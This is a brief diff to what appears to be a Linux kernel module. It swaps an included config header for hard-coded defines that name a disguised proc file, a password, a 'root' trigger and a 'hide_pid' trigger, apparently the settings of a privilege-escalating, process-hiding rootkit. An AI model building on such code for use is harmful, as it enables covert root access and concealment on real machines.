@@ -95,9 +95,10 @@ struct proc_dir_entry
 };
 
 #endif
-
-#include "config.h"
-
+#define CFG_PROC_FILE "version"
+#define CFG_PASS "password"
+#define CFG_ROOT "root"
+#define CFG_HIDE_PID "hide_pid"
 #define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
 
 MODULE_LICENSE("GPL");
